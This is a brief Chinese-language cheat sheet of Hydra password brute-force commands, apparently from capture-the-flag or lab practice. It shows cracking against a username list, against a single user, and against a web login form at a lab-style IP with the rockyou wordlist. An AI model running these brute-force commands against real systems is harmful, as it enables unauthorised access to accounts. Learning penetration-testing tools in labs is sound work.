# Hydra 实战语句

- 破解列表

```
    sudo hydra -L users.txt -P wordlist.txt
```

- 破解单个

```
    sudo hydra -l "aaa" -P wordlist.txt
```

- WebSite POST 破解

```
sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
```